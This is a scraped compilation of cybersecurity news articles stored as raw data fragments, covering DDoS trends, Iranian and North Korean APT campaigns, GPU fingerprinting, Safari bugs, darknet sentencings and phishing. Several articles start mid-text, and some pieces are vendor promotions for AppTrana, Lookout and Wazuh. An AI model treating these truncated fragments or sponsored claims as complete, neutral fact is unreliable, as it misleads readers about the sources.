'text': 'DDoS (Distributed Denial of Service) attacks are making headlines almost every day. 2021 saw a 434% upsurge in DDoS attacks, 5.5 times higher than 2020. Q3 2021 saw a 24% increase in the number of DDoS attacks in comparison to Q3 2020. \nAdvanced DDoS attacks that are typically targeted, known as smart attacks, rose by 31% in the same period. Further, 73% of DDoS attacks in Q3 2021 were multi-vector attacks that combined multiple techniques to attack the targeted systems. The largest percentage of DDoS targets (40.8%) was in the US Banks, and financial institutions were the biggest DDoS and DoS attack targets in the past couple of years. \nDoes this mean businesses and organizations that aren’t in the banking and financial services sector are safe from DDoS attacks? Most definitely not! Every business is a potential DDoS target. Read on to know why and what measures to take to keep your business effectively protected. \nCommon DDoS Targets\nEven though every business can be targeted by attackers, some industries and businesses are more highly targeted. As mentioned earlier, banks and financial institutions were the biggest DDoS targets in 2021. Other commonly targeted industries are: \nEducational institutions Wired telecommunication carriersOnline gaming and gamblingWireless telecom carriersHealthcareGovernments and their agencies ISP, hosting, and related servicesRemote learning companiesTechnology companies, especially with the rise in telecommuting \nIt is also critical to note that SMEs are targeted as much by threat actors as large businesses and corporates. It is a common misconception among SMEs that they will not be targeted and take a lax approach towards DDoS mitigation. Attackers take advantage of this laid-back approach to orchestrate DDoS attacks against SMEs. \n4 Reasons Why Every Business is a Potential Target\n\n1 — Lackadaisical Approach to DDoS Prevention and Security \nDespite the advent of technology, several businesses continue to use traditional tools such as legacy firewalls and dated methods such as signature-based traffic monitoring to protect against DDoS. The attacks today are more sophisticated than ever, and traditional security measures do not suffice. Even attacks that last for a few minutes brings significant financial and reputational damage. \nIt is also critical to note that SMEs are targeted by threat actors as much as large businesses and corporate houses. As attacks against larger corporations tend to make the headlines, it is a common misconception among SMEs that they will not be targeted. So, they tend to take a lax approach towards DDoS mitigation. Attackers take advantage of this laid-back approach to orchestrate DDoS attacks against SMEs. \n2 — Growing Attack Surface \nThe pandemic has significantly accelerated digitization among all kinds of organizations, including government, non-profits, and SMEs. Further, the use of BYOT devices remotely from shared (often insecure) networks has shot up. As the result, every organization has a widening attack surface and an increased risk of DDoS threats. The problem is exacerbated when organizations do not understand the importance of DDoS protection and rely on generic solutions and default solutions provided by the hosting/ ISP/ cloud service provider. \n3 — DDoS Attacks are Easy and Economical to Orchestrate \nA large percentage of DDoS attacks in the past few years have lasted for less than 4 hours. Even though the attacks lasted for a shorter duration, their intensity, frequency, and severity have increased manifold. Today, sophisticated, multi-vector, and smart DDoS attacks are easy and cost-effective to orchestrate more than ever owing to the following reasons:\nTechnological advancesEasy availability of malware tools and botnetsAvailability of DDoS-as-a-service and hacking-as-a-service\nSo, attackers can launch attacks with almost zero effort. Further, the financial benefits of DDoS attacks are high, making them lucrative for attackers. \n4 — Potent Tool for Competitors and Disgruntled Employees\nWebsites that keep crashing or have frequent downtimes (often caused by DDoS attacks) or have their webpages vandalized lose their search engine rankings and reputation. So, competitors and even disgruntled employees often use DDoS as a tactic to erode your search engine rankings and bring about significant reputational damage.\nImportance of DDoS Protection \nBefore moving on to how to prevent these attacks, it is critical to understand the importance of DDoS protection. \n1 — Your website is Always Available \nOne of the most direct and immediate impacts of DDoS is that it overwhelms the website with excessive requests, erodes its resources, and makes it unavailable to legitimate traffic. Until the attack is stopped, any business engagement through the website would be unavailable. It hurts the brand image and business reputation. \nWith effective DDoS protection, businesses can ensure that their website and digital assets are always available. Such DDoS services include globally distributed content delivery networks (CDN) that help accelerate the website speed and performance without compromising on the security front. \n2 — Steer Away Erosion of Search Engine Rankings\nDDoS attacks cause websites to crash, experience downtime, and become unavailable to legit users. Websites that keep crashing or have frequent downtimes lose their search engine rankings. Further, if the website owners do not have backups or do not know how to stop the attack, they will end up losing the search engine’s listing of internal links. So, competitors often use DDoS as a tactic to divert traffic to their website and erode your search engine rankings. With intelligent DDoS protection, all this can be avoided. \n3 — Keep Your Website Protected Against Other Kinds of Attacks \nDDoS attacks are used as smokescreens for other cyberattacks such as malware attacks, creating backdoors, account takeover, extortion, content, and price scraping, etc. With integrated, end-to-end DDoS services, you can monitor the incoming traffic continuously, secure vulnerabilities before attackers find them, and keep your digital assets fully protected. \n4 — Eliminate Possibilities of Cyber-Vandalism and Website Defacements \nDDoS attacks are leveraged by competitors, enemy nation-states, governments, hacktivists, and others for cyber-vandalism and website defacements against companies, governmental agencies, and not-for-profit organizations. To avert being targeted by such actors, DDoS protection is a must. \n5 — Save Time, Money, and Other Resources \nLast but not least, DDoS attacks like others bring extraordinary financial and reputational damage. When websites are protected by managed, intuitive DDoS prevention services, massive amounts of time, money, and effort are saved. \nThe Way Forward: How to Keep Yourself Protected? \nThe best way to keep yourself protected from DDoS attacks is to take a proactive approach to security and onboarding an intelligent, managed, and advanced DDoS protection service such as AppTrana. Indusface AppTrana helps you ensure that you do not become a DDoS target while also helping you accelerate website performance and speed. \n\n\nFound this article interesting?

{'title': 'Researchers Uncover New Iranian Hacking Campaign Targeting Turkish Users',
'text': 'Details have emerged about a previously undocumented malware campaign undertaken by the Iranian MuddyWater advanced persistent threat (APT) group targeting Turkish private organizations and governmental institutions.\n“This campaign utilizes malicious PDFs, XLS files and Windows executables to deploy malicious PowerShell-based downloaders acting as initial footholds into the target’s enterprise,“ Cisco Talos researchers Asheer Malhotra and Vitor Ventura said in a newly published report.\nThe development comes as the U.S. Cyber Command, earlier this month, linked the APT to the Iranian Ministry of Intelligence and Security (MOIS).\nThe intrusions, which are believed to have been orchestrated as recently as November 2021, were directed against Turkish government entities, including the Scientific and Technological Research Council of Turkey (TÜBİTAK), using weaponized Excel documents and PDF files hosted on attacker-controlled or media-sharing websites.\n\nThese maldocs masqueraded as legitimate documents from the Turkish Health and Interior Ministries, with the attacks starting by executing malicious macros embedded in them to propagate the infection chain and drop PowerShell scripts to the compromised system.\nA new addition to the group’s arsenal of tactics, techniques and procedures (TTPs) is the use of canary tokens in the macro code, a mechanism the researchers suspect is being used to track successful infection of targets, thwart analysis, and detect if the payload servers are being blocked at the other end.\n\nCanary tokens, also known as honeytokens, are identifiers embedded in objects like documents, web pages and emails, which, when opened, triggers an alert in the form of an HTTP request, alerting the operator that the object was accessed.\nThe PowerShell script subsequently downloads and executes the next payload, also a PowerShell script that resides in the metadata of the maldoc, which, in turn, acts as the downloader for a third, unidentified PowerShell code that’s ultimately run on the infected endpoint.\nIn a second variant of the attacks observed by Talos, the PDF documents with embedded links were found pointing to Windows executables instead of the Excel files, which then instrumented the infection chain to deploy the PowerShell downloaders.\n\nWhat’s more, the researchers said they found at least two different versions of the executable delivered by the adversary targeting the telecommunications sector in Armenia in June 2021 and Pakistani entities in August 2021, raising the possibility that MuddyWater may have engaged in multiple attacks as part of one long continuous campaign.\nThe disclosure also follows the release of a Private Industry Notification (PIN) by the U.S. Federal Bureau of Investigation (FBI) last week, detailing the malicious cyber activities of an Iran-based cyber company named Emennet Pasargad, which was tied to a sophisticated influence campaign orchestrated to interfere in the 2020 presidential elections.\n“These actors are highly capable and motivated to perform their espionage activities,“ the researchers concluded. “With new techniques such as canary tokens used to track successful infection of targets, MuddyWater has proven their adaptability and unwillingness to refrain themselves from attacking other nations.“\n\n\nFound this article interesting?

{'title': 'Behind The Buzzword: Four Ways to Assess Your Zero Trust Security Posture',
'text': 'With just about everything delivered from the cloud these days, employees can now collaborate and access what they need from anywhere and on any device. While this newfound flexibility has changed the way we think about productivity, it has also created new cybersecurity challenges for organizations.\nHistorically, enterprise data was stored inside data centers and guarded by perimeter-based security tools. But with users using endpoints and networks your IT teams don’t manage, this approach has become antiquated.\nTo combat this new reality, organizations have turned to tactics such as relying on device management and antivirus software, as well as single sign-on and multi-factor authentication. Some vendors have even begun to claim these measures as a form of Zero Trust, a popular idea where organizations should not trust any entity and provide access to its applications and data until its risk levels are verified.\nIn this blog, I will break down what is and what isn’t Zero Trust.\nFour key “just becauses“ of Zero Trust ‍\nWhile most of us understand Zero Trust conceptually, the path to Zero Trust is a complex and constantly evolving journey. As I discussed in a previous Zero Trust blog, there is no silver bullet to achieve Zero Trust, but there are ways for us to visualize and apply it to day-to-day IT and security operations.\nTo figure this out, I recently invited Andrew Olpins, a solutions engineer at Lookout, onto our latest Endpoint Enigma podcast episode. We cut through all the marketing noise and discussed whether there’s a pragmatic way to get started with Zero Trust. Here are a few takeaways from our conversation:‍\n1 — Just because a device is managed doesn’t mean it can be trusted‍\nOften organizations default to managing devices to secure their endpoints. The idea is that if you have control over your employees’ endpoints, they are secure. But it’s not enough. While device management tools can push updates to operating systems and apps, they don’t grant any real-time visibility into the risk levels of the endpoint. Zero Trust only works when you have a continuous understanding of an endpoint so you can make decisions about its access.‍\n2 — Just because a device has antivirus doesn’t mean it’s free of threats‍\nMalware is just one of the many ways a threat actor can compromise your organization. In fact, to skirt detection, attacks often use more sophisticated tactics like creating backdoors into infrastructure via internet-facing remote access systems such as remote desktop protocol (RDP) or virtual private network (VPN). They can also leverage vulnerabilities in operating systems or applications to gain additional access to an endpoint.‍\n3 — Just because someone has the correct ID and password doesn’t mean they’re the user in question‍\nAnother way for an attacker to compromise an endpoint or an account is by using social engineering tactics. There are now countless channels to deliver phishing attacks to an endpoint, such as SMS and third party messaging, email, social media platforms, even dating and gaming apps. With users having easy access to various enterprise apps such as Microsoft Office 365, Slack and SAP SuccessFactors, any of these accounts can be compromised.\nThis is where you need an integrated solution that can detect the context around a user’s behavior. With integrated data loss prevention (DLP) and user and entity behavior analytics (UEBA), security teams can understand the types of data a user seeks to access and whether it aligns with what they need access to and whether it’s normal behavior. Without these, you can’t tell whether a user is who they say they are and enforce Zero Trust.‍\n4 — Just because we know them doesn’t mean they aren’t a risk to your organization‍\nEven when you have figured out that a device or endpoint is legitimate, doesn’t mean they aren’t a threat to your organization. Threats can come from internal users, whether intentional or unintentional. I recently wrote about Pfizer intellectual property being stolen by an employee that went rogue. In addition to malicious insider threats, any of us could easily share content to unauthorized users accidentally.\nLike what Sundaram Lakshmanan, Lookout CTO of SASE Products, wrote in his 2022 Predictions blog, cloud interconnectivity has amplified user errors and compromised accounts threats, because data can now move at lightning speed. This is why DLP and UEBA are essential to a solution, just as it can figure out whether an account is compromised, it can also stop insider threats and data leakage by legitimate employees.\n‍Get your fundamentals right: deploy an integrated Zero Trust solution‍\nThe above “just becauses“ are some of the most common misconceptions about Zero Trust, a concept that should be at the core of every organization’s security posture. By no means is my list comprehensive, but it should get you in the right mindset when it comes to vetting vendors that claim to offer a single tool that can solve challenges related to a remote-first environment. In reality, no one can solve every piece of the Zero Trust journey.\nHere at Lookout we have integrated endpoint security with Secure Access Service Edge (SASE) technologies to ensure that your sensitive data stays secure without hindering the productivity of your work-from-anywhere users.\nHow do we do it? Take a look at this webinar where we break down why Zero Trust isn’t just a buzzword, and how Lookout’s solution ensures that you can deploy intelligent Zero Trust that leverages telemetry from endpoints, users, apps, networks and data.Note — This article is written and contributed by Hank Schless, Senior Manager of Security Solutions at Lookout.\n\n\nFound this article interesting?

{'title': 'Your Graphics Card Fingerprint Can Be Used to Track Your Activities Across the Web',
'text': 'Researchers have demonstrated a new type of fingerprinting technique that exploits a machine’s graphics processing unit (GPU) as a means to persistently track users across the web.\nDubbed DrawnApart, the method “identifies a device from the unique properties of its GPU stack,“ researchers from Australia, France, and Israel said in a new paper, adding “variations in speed among the multiple execution units that comprise a GPU can serve as a reliable and robust device signature, which can be collected using unprivileged JavaScript.“\nA device fingerprint or machine fingerprint is information that is collected about the hardware, installed software, as well as the web browser and its associated add-ons from a remote computing device for the purpose of unique identification.\nFingerprints can be a double-edged sword. On the one hand, a fingerprint algorithm may allow a service provider (e.g., bank) to detect and prevent identity theft and credit card fraud. But it can also be abused to compile long-term records of individuals’ browsing activity for targeted advertising, especially as third-party cookie controls tighten.\n\nBrowser fingerprinting, in a similar vein, primarily relies on stitching together key pieces of information gleaned from the browser to create the fingerprint. The attributes run the gamut, spanning the browser’s version, OS, timezone, screen, language, list of fonts, and even the way the browser renders text and graphics.\nBut browser fingerprints also suffer from one major drawback in that they can evolve over time, making it harder to track users for extended periods. That’s where DrawnApart comes in.\nIt’s not only the first-of-its-kind mechanism to explore and weaponize the manufacturing differences between identical GPUs, but also for reliably using the approach to distinguish between machines with identical hardware and software configurations, effectively undermining users’ privacy.\n\nAt its core, the proposed tracking system involves measuring the time required to render different graphics primitives using the WebGL API, each targeting different execution units that comprise a GPU, to create a fingerprint trace that’s then fed into a deep learning network to uniquely identify the specific device that generated it.\n\nIn an evaluation setup constituting 2,550 crowd-sourced devices, including Windows 10 desktops, Apple Mac mini devices, and multiple generations of Samsung Galaxy smartphones, the researchers found that when used in conjunction with state-of-the-art fingerprint linking algorithms like FP-STALKER, DrawnApart extended the median average tracking period from 17.5 days to 28 days.\nCountermeasures to block the GPU fingerprinting method range from script blocking to disabling WebGL, and limiting each web page to a single execution unit, or even turning off hardware-accelerated rendering — a move the researchers warn could severely affect usability and responsiveness.\nFurthermore, the ongoing development into the WebGPU standard — currently available in canary releases of Google Chrome and Mozilla Firefox — is expected to drastically reduce the time taken to collect the fingerprint, prompting the academics to conclude that the “effects of accelerated compute APIs on user privacy should be considered before they are enabled globally.“\n\n\nFound this article interesting?

As of January 2022, Google Fonts is a repository for 1,358 font families and is used by over 50.1 million websites.\n\nUnder the European Union’s General Data Protection Regulation (GDPR), data points such as IP addresses, advertising IDs, and cookies are counted as personal identifiable information (PII), making it mandatory for businesses to seek users’ explicit permission before processing such information.\nIn addition, the court noted that “Google Fonts can also be used by the defendant without a connection to a Google server is established and the IP address of the website user is transmitted to Google,“ effectively requiring websites to host the fonts locally.\n\nAside from ordering the website to stop disclosing the IP address by embedding the font library, the court also urged the company running the website to share with the affected party information about the kind of personal data that it stores and is being processed.\nThe decision comes weeks after the Austrian Data Protection Authority (DSB) ruled that the use of Google Analytics by a health-focused website called NetDoktor violates the GDPR regulation by exporting visitors’ data to Google servers in the U.S., thereby opening the door for potential surveillance by the U.S. intelligence services.\n\n\nFound this article interesting?

Over the years, PUFs have been widely used in smartcards to provide “silicon fingerprints“ as a means of uniquely identifying cardholders based on a challenge-response authentication scheme.\nThe newly proposed method from GIST employs native silk fibers produced by silkworms to create PUF-based tags that are then used to devise a PUF module. This mechanism banks on the underlying principle that a light beam experiences diffraction when it hits an obstacle, in this case, the silk fiber.\n\n“[T]he nanofibrillar structures in each microfiber significantly improves the light intensity contrast between the background and focal spots owing to the strong scattering,“ the researchers noted in a paper published in Nature Communications. “These novel optical features could easily implement the module of a lens-free optical PUF by placing a silk ID card on the image sensor.“\n\nThe captured diffracted light is unique, “giving rise to a unique pattern of light,“ that is subsequently converted into a digital format and fed into the system as input, researcher and the study’s author Young Min Song said.\nShould such a system be deployed for user authentication using a smart card, the researchers said that faking an authentication key generated from the module via a brute-force attack would take as long as 5 x 1041 years to crack it open, making it cryptographically unbreakable.\n“To our knowledge, this is the first PUF module designed using silk, a naturally abundant biomaterial,“ Prof. Yong said in a statement. “It means that we don’t need to invest time in developing complicated security keys, nature has already done this for us.“\n\n\nFound this article interesting?

'text': 'Apple last year fixed a new set of macOS vulnerabilities that exposed Safari browser to attack, potentially allowing malicious actors to access users’ online accounts, microphone, and webcam.\nSecurity researcher Ryan Pickren, who discovered and reported the bugs to the iPhone maker, was compensated with a $100,500 bug bounty, underscoring the severity of the issues.\nBy exploiting a chain of security issues with iCloud Sharing and Safari 15, it enables the attacker to hijack the multimedia permission and gain “full access to every website ever visited by the victim“ in Safari, including Gmail, iCloud, Facebook, and PayPal accounts.\n\nThe issues specifically concern ShareBear, an iCloud file-sharing mechanism that prompts users upon attempting to open a shared document for the first time. Taking advantage of the fact that users are never displayed the prompt again once they accept to open the file, Pickren found that it’s possible to alter the file’s content to anything by anyone with access to the file.\n“ShareBear will then download and update the file on the victim’s machine without any user interaction or notification,“ Pickren explained in a technical write-up. “In essence, the victim has given the attacker permission to plant a polymorphic file onto their machine and the permission to remotely launch it at any moment.“\n\nIn other words, an image file with a .PNG format could have its entire content and extension changed to an executable binary (“evil.dmg“) after the user has agreed to open it. The binary can then be launched, triggering an exploit chain that leverages additional flaws discovered in Safari to take over the machine’s mic or webcam, or even steal local files —\nCVE-2021-30861 – A logic issue in WebKit that could allow a malicious application to bypass Gatekeeper checksCVE-2021-30975 – An issue in Script Editor that could allow a malicious OSAX scripting addition to bypass Gatekeeper checks and circumvent sandbox restrictions\n\nThis is the second time Pickren has disclosed flaws in iOS and macOS that, if successfully exploited, could be abused to access the camera in an unauthorized manner upon visiting a specially crafted website.\n“This project was an interesting exploration of how a design flaw in one application can enable a variety of other, unrelated, bugs to become more dangerous,“ Pickren said. “It was also a great example of how even with macOS Gatekeeper enabled, an attacker can still achieve a lot of mischief by tricking approved apps into doing malicious things.“\n\n\nFound this article interesting?

'text': 'An Israeli national was sentenced to 97 months in prison in connection with operating the DeepDotWeb (DDW) clearnet website, nearly a year after the individual pleaded guilty to the charges.\nTal Prihar, 37, an Israeli citizen residing in Brazil, is said to have played the role of an administrator of DDW since the website became functional in October 2013. He pleaded guilty to money laundering charges in March 2021 and agreed to forfeit the illegally amassed profits.\nDDW, until its seizure in May 2019, ostensibly served as a “news“ website that connected internet users with underground marketplaces on the dark web that operate via darknets such as Tor, enabling the purchase of illegal firearms, malware and hacking tools, stolen financial data, heroin, fentanyl, and other illicit materials.\n\nPrihar, acting in cohorts with co-defendant Michael Phan, 34, of Israel, provided direct links to illegal marketplaces and in return for advertising these links, reaped substantial profits by receiving kickbacks from the operators of the marketplaces in the form of virtual currency amounting to 8,155 bitcoins (worth $8.4 million at the time of the transactions).\n“To conceal the nature and source of these illegal kickback payments, Prihar transferred the payments from his DDW bitcoin wallet to other bitcoin accounts and to bank accounts he controlled in the names of shell companies,“ the U.S. Department of Justice (DoJ) said in a release last week.\nSeparately, the DoJ also publicized the sentencing of an associate of the Dark Overlord hacking group for his role in possessing and selling more than 1,700 stolen identities, including social security numbers, on the dark web marketplace AlphaBay.\nSlava Dmitriev, a 29-year-old Canadian citizen who was apprehended in Greece in September 2020 and extradited to the U.S. in January 2021, was awarded a jail term of three years after he pleaded guilty in August 2021 to fraud charges.\n\n“From May 2016 through July 2017, Dmitriev sold 1,764 items on AlphaBay for approximately $100,000,“ the DoJ said in a press statement. “The vast majority of these items were stolen identities, including names, dates of birth, social security numbers, and other personally identifiable information.“\nIn related news, law enforcement authorities in Canada seized and shut down Canadian HeadQuarters (aka CanadianHQ), a darknet marketplace that specialized in the purchase and sale of spam services, phishing kits, stolen credential data dumps, and access to compromised machines, which were used by purchasers to engage in a variety of malicious activities.\nThe development also follows the Europol-led takedown of VPNLab.net, a VPN provider that was used by malicious actors to deploy ransomware against more than 100 businesses and facilitate other cybercrimes, earlier this month.\n\n\nFound this article interesting?

{'title': 'Hackers Using Device Registration Trick to Attack Enterprises with Lateral Phishing',
'text': 'Microsoft has disclosed details of a large-scale, multi-phase phishing campaign that uses stolen credentials to register devices on a victim’s network to further propagate spam emails and widen the infection pool.\nThe tech giant said the attacks manifested through accounts that were not secured using multi-factor authentication (MFA), thereby making it possible for the adversary to take advantage of the target’s bring-your-own-device (BYOD) policy and introduce their own rogue devices using the pilfered credentials.\nThe attacks took place in two stages. “The first campaign phase involved stealing credentials in target organizations located predominantly in Australia, Singapore, Indonesia, and Thailand,“ Microsoft 365 Defender Threat Intelligence Team said in a technical report published this week.\n\n“Stolen credentials were then leveraged in the second phase, in which attackers used compromised accounts to expand their foothold within the organization via lateral phishing as well as beyond the network via outbound spam.“\nThe campaign started with users receiving a DocuSign-branded phishing lure containing a link, which, upon clicking, redirected the recipients to a rogue website masquerading as the login page for Office 365 to steal the credentials.\nThe credential theft not only resulted in the compromise of over 100 mailboxes across different companies, but also enabled the attackers to implement an inbox rule to thwart detection. This was then followed by a second attack wave that abused the lack of MFA protections to enroll an unmanaged Windows device to the company’s Azure Active Directory (AD) instance and spread the malicious messages.\n\nBy connecting the attacker-controlled device to the network, the novel technique made it viable to expand the attackers’ foothold, covertly proliferate the attack, and move laterally throughout the targeted network.\n“To launch the second wave, the attackers leveraged the targeted user’s compromised mailbox to send malicious messages to over 8,500 users, both in and outside of the victim organization,“ Microsoft said. “The emails used a SharePoint sharing invitation lure as the message body in an attempt to convince recipients that the ’Payment.pdf’ file being shared was legitimate.“\nThe development comes as email-based social engineering attacks continue to be the most dominant means for attacking enterprises to gain initial entry and drop malware on compromised systems.\n\nEarlier this month, Netskope Threat Labs disclosed a malicious campaign attributed to the OceanLotus group that bypassed signature-based detections by using non-standard file types such as web archive file (.MHT) attachments to deploy information-stealing malware.\nIn addition to turning on MFA, implementing best practices such as good credential hygiene and network segmentation can “increase the ’cost’ to attackers trying to propagate through the network.“\n“These best practices can limit an attacker’s ability to move laterally and compromise assets after initial intrusion and should be complemented with advanced security solutions that provide visibility across domains and coordinate threat data across protection components,“ Microsoft added.\n\n\nFound this article interesting?

{'title': 'How Wazuh Can Improve Digital Security for Businesses',
'text': '2021 was a year peppered by cyberattacks, with numerous data breaches happening. Not only that, but ransomware has also become a prominent player in the hackers’ world.\nNow, more than ever, it’s important for enterprises to step up cybersecurity measures. They can do this through several pieces of technology, such as an open-source security platform like Wazuh. \nWazuh is a free and open source security platform that unifies XDR and SIEM capabilities, which not only enables companies to detect sophisticated threats, but can also help immensely in preventing data breaches and leaks from happening. As a result, it can save businesses from costly fixes that can ultimately end in their closure.\nIt is also possible to integrate Wazuh with a number of external services and tools. Some of them are VirusTotal, YARA, Amazon Macie, Slack, and Fortigate Firewall. Consequently, companies can improve their security against hackers from penetrating their networks.\nWhat’s great about Wazuh is that it’s scalable, open source and free. It can compete with many high-end cybersecurity solutions that are available for a lot of money. So this can help SMEs immensely budget-wise.\nRead on to find out more on how Wazuh can help with cybersecurity for businesses.\nSecurity Analytics\nWazuh automatically collects and aggregates security data from systems running Linux, Windows, macOS, Solaris, AIX, and other operating systems in the monitored domain, making it an extremely comprehensive SIEM solution.\n\nBut more importantly, Wazuh also analyzes and correlates data in order to detect anomalies and intrusions. This type of intelligence means there’s early threat detection in various environments.\nFor example, Wazuh can be used in the office, as well as in cloud environments so remote workers can still reap the benefits of Wazuh. Improving digital security won’t have to be limited to just a brick-and-mortar setting.\nIntrusion Detection\nWazuh software has multi-platform agents that monitor systems, detect threats, and trigger automatic responses as needed. More specifically, they hone in on rootkits and malware, as well as suspicious anomalies.\nIn addition, these agents can detect stealth technology like hidden files, cloaked processes, and unregistered network listeners.\n\nOn top of these capabilities for intrusion detection, Wazuh’s server has a signature-based approach. It analyzes collected log data and can determine points of compromise by comparing them with known signatures.\nThis feature can immediately determine and prevent employees from downloading and installing malicious applications.\nThis gives workplaces a safety net. Employee education on cybersecurity should be the first line of defense, after all.\nVulnerability Detection\nWazuh can also pinpoint where network vulnerabilities are. This allows enterprises to find their weakest links and plug up holes before cybercriminals can exploit them first.\n\nWazuh agents will pull software inventory data and send it to their server. Here, it’s compared with continuously updated common vulnerabilities and exposure (CVE) databases. As a result, these agents will find and identify any software that’s vulnerable.\nIn many cases, antivirus software can take care of these vulnerabilities. These programs release security patches on a regular basis. \nBut in rare cases, antivirus developers won’t find vulnerabilities in time. Or they might not find them at all, which can leave businesses exposed. Having Wazuh means businesses get an extra set of eyes to ensure their cybersecurity is airtight.\nLog Data Analysis\nNot only does Wazuh collect network data and application logs, but it also securely sends them to a central manager for rule-based analysis and storage.\nThis analysis of log data is based on over 3000 different rules that identify anything that has gone wrong, whether it is an outside force or user error. For example, the rules in place can detect application or system errors, policy violations, misconfigurations, as well as attempted or successful malicious activity.\n\nIn addition, the log data analysis can pinpoint both attempted and successful malicious activities. Early detection is key in keeping networks safe.\nEnterprises can learn from attempted malicious activities and upgrade their cybersecurity accordingly.\nAnd for successful malicious activities, the system can quickly quarantine infected files. Or they can delete them before they can do more damage.\nAnother thing the log data analysis can show is policy violations. Whether they’re intentional or unintentional, these violations can be brought to management’s attention. Then, they can take swift action to rectify the situation.\nFile Integrity Monitoring\nWazuh’s File integrity monitoring (FIM) feature can be configured to scan selected files or directories periodically and alert the user when any changes are detected. Not only does it keep track of which users create and modify files, but it also tracks which applications are used and when ownership is changed.\n\nThanks to the level of detail from file integrity monitoring, businesses will be able to know exactly when threats come in. They’ll also identify compromised hosts right away.\nFor instance, ransomware is now rampant, but Wazuh can help prevent and detect this threat. Should a hacker attempt phishing, the security monitoring will pick up on the malicious files that have snuck in. It will detect new files created, as well as any original files removed.\nShould there be a high number of these instances, the file integrity monitoring will flag it as a possible ransomware attack. Note that custom rules should be created for this to happen.\nConfiguration Assessment\nSecurity compliance is essential to improve an organization’s security posture and reduce its attack surface. But it can be both time-consuming and challenging. Fortunately, Wazuh can assist with it.\nWazuh’s Automated Security Configuration Assessment (SCA) looks for misconfigurations and helps maintain a standard configuration across all monitored endpoints.\n\nIn addition, Wazuh agents also scan applications that are known to be vulnerable, unpatched or configured insecurely. That way, the strongest cybersecurity walls are up at all times.\nRegulatory Compliance\nOn the topic of compliance, the regulatory compliance feature also helps users keep up with standards and regulations. More importantly, it allows businesses to scale and integrate other platforms.\n\nWazuh generates reports with its web user interface. There are also multiple dashboards to enable users to manage all platforms from one place. If the agents notice anything that’s non-compliant, the users are instantly alerted.\nIts ease of use lets many financial companies meet Payment Card Industry Data Security Standard (PCI DSS) requirements. This includes payment processing companies, too.\nThose in the healthcare industry can have peace of mind knowing they’re HIPAA-compliant. And for those who deal with European data, they’ll be GDPR-compliant as well.\nIncident Response\nIncident response is a very useful feature of Wazuh for active threats. There are out-of-the-box active responses, which means the user doesn’t have to do anything to set them up. Should the system detect active threats, countermeasures jump into action right away.\nFor example, many hackers use brute-force attacks to guess username and password combinations. Wazuh will take note of each failed authentication attempt.\nWith enough failures, the system will recognize them as part of a brute-force attack. Because a certain criterion is met (e.g., five failed login attempts), it will block that IP address from further attempts. This means not only can Wazuh pick up on brute-force attacks, but it can also shut them down.\nAdditionally, users can use it to run remote commands and system queries. They can also remotely identify indicators of compromise (IOCs).\nThis allows third parties to run live forensics and incident response tasks. As a result, this opens up opportunities to work with more professionals who can safeguard company data.\nCloud Security\nToday, many workplaces use the cloud to store files. This allows employees to access them from all over the world, so long as they have an internet connection.\n\nBut with this convenience comes a new security concern. Anyone with an internet connection can possibly hack the cloud and gain access to sensitive data.\nWazuh uses integration modules, which pull security data from well-known cloud providers, such as Amazon AWS, Microsoft Azure or Google Cloud. In addition, it sets rules for a user’s cloud environment to spot potential weaknesses.\nIt works similarly to the vulnerability detection function. It will alert users to intrusion attempts, system anomalies, and unauthorized user actions. \nContainers Security\nWazuh’s containers security feature provides cyber threat intelligence for Docker hosts, Kubernetes nodes and containers. Again, it will find system anomalies, vulnerabilities, and threats.\nThe agent’s native integration means users don’t have to set up connections with their Docker hosts and containers. It will keep collecting and analyzing data. It will also provide users with continuous monitoring of running containers.\nWazuh is a Must for Enterprises\nAs the digital world keeps evolving, so do cybercriminals. Therefore, keeping up with cybersecurity measures and investing in top-of-the-line intrusion detection is essential.\nWazuh combines all of these features in a single platform, making it a powerful tool for analysts as well as a real force multiplier for overburdened IT staff.\nComparatively to other solutions, Wazuh automatically adds relevant context to alerts and analyses, enables better decision-making, and assists in improving compliance and risk management.\nWhen combined with vulnerability detection, file integrity monitoring, and configuration assessment, Wazuh can assist enterprises in staying one step ahead of hackers.\nBy investing time and resources into this free platform, businesses can build more layers to their cybersecurity measures. And in return, they will set themselves up for more secure networks for years to come.\nWazuh integrations\nBelow there are several links where you can see how Wazuh can be integrated with different applications and software and how capabilities can be extended with these integrations:\nVirusTotalYARASlackOwlhSuricata\n\n\nFound this article interesting?

'text': 'The notorious Lazarus Group actor has been observed mounting a new campaign that makes use of the Windows Update service to execute its malicious payload, expanding the arsenal of living-off-the-land (LotL) techniques leveraged by the APT group to further its objectives.\nThe Lazarus Group, also known as APT38, Hidden Cobra, Whois Hacking Team, and Zinc, is the moniker assigned to the North Korea-based nation-state hacking group that’s been active since at least 2009. Last year, the threat actor was linked to an elaborate social engineering campaign targeting security researchers.\n\nThe latest spear-phishing attacks, which Malwarebytes detected on January 18, originate from weaponized documents with job-themed lures impersonating the American global security and aerospace company Lockheed Martin.\nOpening the decoy Microsoft Word file triggers the execution of a malicious macro embedded within the document that, in turn, executes a Base64-decoded shellcode to inject a number of malware components into the “explorer.exe“ process.\nIn the next phase, one of the loaded binaries, “drops_lnk.dll,“ leverages the Windows Update Client (“wuauclt.exe“) – which is used as a defense evasion technique to blend-in malicious activity with legitimate Windows software – to run a command that loads a second module called “wuaueng.dll.“\n“This is an interesting technique used by Lazarus to run its malicious DLL using the Windows Update Client to bypass security detection mechanisms,“ researchers Ankur Saini and Hossein Jazi noted. “With this method, the threat actor can execute its malicious code through the Microsoft Windows Update Client.“\n\nThe cybersecurity firm characterized “wuaueng.dll“ as “one of the most important DLLs in the attack chain,“ whose main purpose is to establish communications with a command-and-control (C2) server – a GitHub repository hosting malicious modules masquerading as PNG image files. The GitHub account is said to have been created on January 17, 2022.\nMalwarebytes said that the links to Lazarus Group are based on several pieces of evidence tying them to past attacks by the same actor, including infrastructure overlaps, document metadata, and the use of job opportunities template to single out its victims.\n“Lazarus APT is one of the advanced APT groups that is known to target the defense industry,“ the researchers concluded. “The group keeps updating its toolset to evade security mechanisms. Even though they have used their old job theme method, they employed several new techniques to bypass detections.“\n\n\nFound this article interesting?

On top of that, the various support files dropped to facilitate the compromise are also now encrypted using AES.\n“Cleverly, they reused the algorithm used for string protection, making the file layout identical to the protected strings layout, as they appear in raw memory,“ Santox detailed.\nThe significant updates are an example of how quickly sophisticated actors can evolve their tactics and techniques to create something potent and effective that can go past security and detection layers.\n\n\nFound this article interesting?

